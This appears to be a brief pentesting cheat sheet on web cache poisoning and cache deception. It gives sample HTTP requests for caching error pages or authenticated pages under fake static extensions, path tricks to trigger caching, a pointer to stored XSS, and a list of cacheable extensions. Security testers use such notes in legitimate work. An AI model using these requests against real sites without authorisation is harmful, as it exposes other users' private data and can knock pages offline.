# Cache Poisoning

Check if the server is caching requests. You can tellby looking the headers and looking fot the word "HIT".

## If application does not have login function:

Add an unknown header value to force the page get 400 cached result

```
GET /home HTTP/1.1
Host: target.com
\:
```

## If application has login function:

Login into an account and find a page that returns sensitive information.
Add cachable extension (.js, .css) to the url. Extension FUZZ works here.

```
GET /home/.js HTTP/1.1
Host: target.com
```

Open the malformed URL in browser as unauthenticated user and grab results. Or use Curl.

## Trigger Cache

* /profile.css
* /profile/nonexistent.css
* /profile?nonexistent
* /profile/x.jpeg?nonexistent

## Stored XSS

Find an endpoint that reflects content to page (cookies, parameter, headers..) and store it by poisoning the cache

## List of cachable extensions

```
7z
csv
gif
midi
png
tif
zip
avi
doc
gz
mkv
ppt
tiff
zst
avif
docx
ico
mp3
pptx
ttf
apk
dmg
iso
mp4
ps
webm
bin
ejs
jar
ogg
rar
webp
bmp
eot
jpg
otf
svg
woff
bz2
eps
jpeg
pdf
svgz
woff2
class
exe
js
pict
swf
xls
css
flac
mid
pls
tar
xlsx
```
